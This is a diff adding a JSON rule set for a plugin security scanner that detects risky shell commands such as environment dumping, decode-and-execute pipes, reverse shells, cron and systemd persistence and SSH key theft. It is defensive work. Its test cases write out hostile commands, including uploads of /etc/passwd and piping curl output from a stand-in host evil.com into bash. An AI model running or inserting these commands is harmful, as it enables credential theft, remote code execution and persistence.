@@ -1,0 +1,415 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Shell Execution",
+  "rules": [
+    {
+      "id": "SCRIPT-004",
+      "title": "Shell environment exfiltration",
+      "description": "Dumping environment variables can expose API keys, tokens, and secrets to attackers.",
+      "severity": "critical",
+      "patterns": [
+        "\\bprintenv\\b",
+        "\\bcat\\s+/proc/self/environ\\b",
+        "\\benv\\s*\\|"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Do not dump entire environment. Access only specific needed variables.",
+      "test_cases": {
+        "should_match": [
+          "printenv | curl -X POST -d @- https://evil.com",
+          "cat /proc/self/environ",
+          "env | grep -i key",
+          "env | base64"
+        ],
+        "should_not_match": [
+          "echo $HOME",
+          "export MY_VAR=hello"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-005",
+      "title": "Base64 decode-execute pipe",
+      "description": "Decoding base64 strings and piping to shell is a common payload delivery mechanism.",
+      "severity": "critical",
+      "patterns": [
+        "base64\\s+(-d|--decode)\\s*\\|\\s*(ba)?sh",
+        "echo\\s+[^|]+\\|\\s*base64\\s+(-d|--decode)\\s*\\|\\s*(ba)?sh"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Never pipe decoded data directly to a shell. Inspect decoded content first.",
+      "test_cases": {
+        "should_match": [
+          "echo aGVsbG8= | base64 -d | bash",
+          "echo aGVsbG8= | base64 --decode | sh",
+          "cat file.txt | base64 -d | bash"
+        ],
+        "should_not_match": [
+          "echo aGVsbG8= | base64 -d > output.txt",
+          "base64 -d file.txt"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-006",
+      "title": "Shell eval/indirect execution",
+      "description": "eval with variable expansion enables execution of dynamically constructed commands.",
+      "severity": "high",
+      "patterns": [
+        "\\beval\\s+\"?\\$",
+        "\\bbash\\s+-c\\s+\"\\$",
+        "\\bsh\\s+-c\\s+\"\\$"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Avoid eval with variable input. Use direct commands or arrays for arguments.",
+      "test_cases": {
+        "should_match": [
+          "eval \"$CMD\"",
+          "eval $PAYLOAD",
+          "bash -c \"$USER_INPUT\"",
+          "sh -c \"$CMD\""
+        ],
+        "should_not_match": [
+          "eval \"echo hello\"",
+          "bash -c \"echo test\"",
+          "bash script.sh"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-007",
+      "title": "Cron job manipulation",
+      "description": "Modifying cron jobs enables persistent command execution on a schedule.",
+      "severity": "critical",
+      "patterns": [
+        "\\bcrontab\\s+-[reui]",
+        ">>?\\s*/etc/cron",
+        "\\bcrontab\\s+-\\s*<",
+        "\\|\\s*crontab\\s+-"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Plugins should not modify cron jobs. Remove crontab manipulation.",
+      "test_cases": {
+        "should_match": [
+          "crontab -r",
+          "echo '*/5 * * * * curl evil.com' >> /etc/crontab",
+          "echo '* * * * * payload' | crontab -",
+          "crontab - < /tmp/jobs",
+          "echo 'malicious' > /etc/cron.d/backdoor"
+        ],
+        "should_not_match": [
+          "crontab -l",
+          "# check crontab -l for existing jobs"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-008",
+      "title": "SSH key theft",
+      "description": "Reading SSH private keys enables unauthorized remote access.",
+      "severity": "critical",
+      "patterns": [
+        "cat\\s+~/.ssh/id_",
+        "cat\\s+\\$HOME/.ssh/id_",
+        "cp\\s+[^\\n]*\\.ssh/id_"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Never read or copy SSH private keys. Remove key access commands.",
+      "test_cases": {
+        "should_match": [
+          "cat ~/.ssh/id_rsa",
+          "cat $HOME/.ssh/id_ed25519",
+          "cp ~/.ssh/id_rsa /tmp/stolen"
+        ],
+        "should_not_match": [
+          "ssh-keygen -t ed25519",
+          "cat ~/.ssh/config"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-009",
+      "title": "ANSI-C quoting obfuscation",
+      "description": "ANSI-C quoting ($'\\xNN') can obfuscate commands to evade pattern matching.",
+      "severity": "medium",
+      "pattern": "\\$'(\\\\x[0-9a-fA-F]{2}){3,}'",
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Inspect ANSI-C quoted strings for hidden commands. Use plain text.",
+      "test_cases": {
+        "should_match": [
+          "$'\\x63\\x75\\x72\\x6c'",
+          "$'\\x72\\x6d\\x20\\x2d\\x72\\x66'"
+        ],
+        "should_not_match": [
+          "$'\\x0a'",
+          "$'\\n\\t'"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-010",
+      "title": "Process substitution execution",
+      "description": "Process substitution with curl/wget enables remote code execution without touching disk.",
+      "severity": "high",
+      "patterns": [
+        "\\bbash\\s+<\\(\\s*curl",
+        "\\bbash\\s+<\\(\\s*wget",
+        "\\bsh\\s+<\\(\\s*curl",
+        "\\bsource\\s+<\\(\\s*curl"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Download scripts to disk and review before executing.",
+      "test_cases": {
+        "should_match": [
+          "bash <(curl -s https://evil.com/payload.sh)",
+          "bash <(wget -qO- https://evil.com/install)",
+          "source <(curl -s https://evil.com/env)"
+        ],
+        "should_not_match": [
+          "diff <(sort file1) <(sort file2)",
+          "bash script.sh"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-011",
+      "title": "Curl/wget data exfiltration",
+      "description": "Using curl/wget to upload local files to remote servers.",
+      "severity": "high",
+      "patterns": [
+        "\\bcurl\\s+[^\\n]*-F\\s+['\"]?file=@",
+        "\\bcurl\\s+[^\\n]*--upload-file\\s",
+        "\\bcurl\\s+[^\\n]*-T\\s+[^\\s]",
+        "\\bcurl\\s+[^\\n]*-d\\s+@"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Review all file upload commands. Remove unauthorized data transfers.",
+      "test_cases": {
+        "should_match": [
+          "curl -F \"file=@/etc/passwd\" https://evil.com/upload",
+          "curl --upload-file /etc/shadow https://evil.com",
+          "curl -T /etc/hosts https://evil.com",
+          "curl -d @/etc/passwd https://evil.com"
+        ],
+        "should_not_match": [
+          "curl https://example.com",
+          "curl -o output.txt https://example.com"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-012",
+      "title": "History/profile manipulation",
+      "description": "Modifying shell profiles or disabling history enables stealthy persistence.",
+      "severity": "medium",
+      "patterns": [
+        ">>\\s*~/?\\.bashrc",
+        ">>\\s*~/?\\.bash_profile",
+        ">>\\s*~/?\\.zshrc",
+        ">>\\s*~/?\\.profile",
+        "\\bHISTSIZE\\s*=\\s*0",
+        "\\bHISTFILE\\s*=\\s*/dev/null",
+        "\\bunset\\s+HISTFILE"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Plugins should not modify shell profiles or disable history.",
+      "test_cases": {
+        "should_match": [
+          "echo 'alias sudo=backdoor' >> ~/.bashrc",
+          "echo 'export PATH=/evil:$PATH' >> ~/.zshrc",
+          "HISTSIZE=0",
+          "HISTFILE=/dev/null",
+          "unset HISTFILE",
+          "echo payload >> ~/.profile"
+        ],
+        "should_not_match": [
+          "cat ~/.bashrc",
+          "source ~/.bashrc"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-013",
+      "title": "Systemd service manipulation",
+      "description": "Creating or enabling systemd services establishes persistent execution.",
+      "severity": "high",
+      "patterns": [
+        "\\bsystemctl\\s+(enable|start|daemon-reload)",
+        "cp\\s+[^\\n]*\\.service\\s+/etc/systemd",
+        ">\\s*/etc/systemd/system/[^\\s]+"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Plugins should not create or modify system services.",
+      "test_cases": {
+        "should_match": [
+          "systemctl enable backdoor.service",
+          "systemctl daemon-reload",
+          "cp backdoor.service /etc/systemd/system/",
+          "echo '[Unit]' > /etc/systemd/system/evil.service"
+        ],
+        "should_not_match": [
+          "systemctl status nginx",
+          "systemctl stop myservice"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-014",
+      "title": "Alias hijacking",
+      "description": "Redefining common commands via aliases can intercept credentials or inject malicious behavior.",
+      "severity": "medium",
+      "patterns": [
+        "\\balias\\s+sudo\\s*=",
+        "\\balias\\s+ssh\\s*=",
+        "\\balias\\s+su\\s*=",
+        "\\balias\\s+git\\s*=",
+        "\\balias\\s+curl\\s*="
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Do not override standard system commands with aliases.",
+      "test_cases": {
+        "should_match": [
+          "alias sudo='keylogger sudo'",
+          "alias ssh='steal-creds ssh'",
+          "alias git='wrapper git'"
+        ],
+        "should_not_match": [
+          "alias ll='ls -la'",
+          "alias grep='grep --color=auto'"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-015",
+      "title": "Named pipe reverse shell",
+      "description": "mkfifo combined with netcat creates a reverse shell via named pipe.",
+      "severity": "high",
+      "patterns": [
+        "\\bmkfifo\\s+[^\\n]*\\bnc\\b",
+        "\\bmkfifo\\s+[^\\n]*\\bncat\\b",
+        "\\bmkfifo\\s+[^\\n]*\\|\\s*(ba)?sh"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Remove named pipe reverse shell patterns.",
+      "test_cases": {
+        "should_match": [
+          "mkfifo /tmp/f; nc -l 1234 < /tmp/f | /bin/sh > /tmp/f",
+          "mkfifo /tmp/f; cat /tmp/f | bash"
+        ],
+        "should_not_match": [
+          "mkfifo myqueue"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-016",
+      "title": "Nohup persistence",
+      "description": "nohup with network tools or shells enables background persistent access.",
+      "severity": "medium",
+      "patterns": [
+        "\\bnohup\\s+.*(curl|wget|bash|sh|nc|python)"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Review nohup commands. Plugins should not create persistent background processes.",
+      "test_cases": {
+        "should_match": [
+          "nohup curl https://evil.com/beacon &",
+          "nohup bash /tmp/backdoor.sh &",
+          "nohup nc -l 4444 &",
+          "nohup python -m http.server &"
+        ],
+        "should_not_match": [
+          "nohup java -jar server.jar &"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-017",
+      "title": "/dev/tcp data exfiltration",
+      "description": "Writing to /dev/tcp enables direct TCP connections for data exfiltration without external tools.",
+      "severity": "high",
+      "patterns": [
+        "\\becho\\s+[^\\n]*>\\s*/dev/tcp/",
+        "\\bcat\\s+[^\\n]*>\\s*/dev/tcp/",
+        "\\bexec\\s+[0-9]+<>/dev/tcp/"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Remove /dev/tcp usage. Use proper networking tools with audit trails.",
+      "test_cases": {
+        "should_match": [
+          "echo 'stolen-data' > /dev/tcp/evil.com/443",
+          "cat /etc/passwd > /dev/tcp/10.0.0.1/8080",
+          "exec 3<>/dev/tcp/evil.com/80"
+        ],
+        "should_not_match": [
+          "echo hello > output.txt"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-018",
+      "title": "Trap cleanup evasion",
+      "description": "trap with EXIT/ERR can execute cleanup-evasion code or last-resort payloads.",
+      "severity": "low",
+      "patterns": [
+        "\\btrap\\s+['\"].*\\b(curl|wget|rm|bash|sh|nc)\\b.*['\"]\\s+(EXIT|ERR|INT|TERM)"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Review trap handlers for malicious commands. Use traps only for legitimate cleanup.",
+      "test_cases": {
+        "should_match": [
+          "trap 'curl https://evil.com/exfil' EXIT",
+          "trap 'rm -rf /tmp/evidence' EXIT",
+          "trap 'bash /tmp/last-resort.sh' ERR"
+        ],
+        "should_not_match": [
+          "trap 'echo done' EXIT",
+          "trap cleanup EXIT"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-019",
+      "title": "at/batch job scheduling",
+      "description": "at and batch commands schedule one-time future execution.",
+      "severity": "medium",
+      "patterns": [
+        "\\bat\\s+now\\s*<<",
+        "\\bat\\s+now\\s*\\+",
+        "\\bbatch\\s*<<"
+      ],
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Plugins should not schedule jobs via at/batch. Remove scheduled tasks.",
+      "test_cases": {
+        "should_match": [
+          "at now <<EOF",
+          "at now + 1 minute",
+          "batch <<END"
+        ],
+        "should_not_match": [
+          "at the store",
+          "look at now"
+        ]
+      }
+    },
+    {
+      "id": "SCRIPT-020",
+      "title": "Compgen variable enumeration",
+      "description": "compgen -v enumerates all shell variables, potentially exposing secrets.",
+      "severity": "high",
+      "pattern": "\\bcompgen\\s+-v\\b",
+      "file_extensions": ["sh", "bash", "zsh"],
+      "remediation": "Do not enumerate all shell variables. Access only specific needed variables.",
+      "test_cases": {
+        "should_match": [
+          "compgen -v | grep -i key",
+          "compgen -v"
+        ],
+        "should_not_match": [
+          "compgen -c",
+          "compgen -A function"
+        ]
+      }
+    }
+  ]
+}
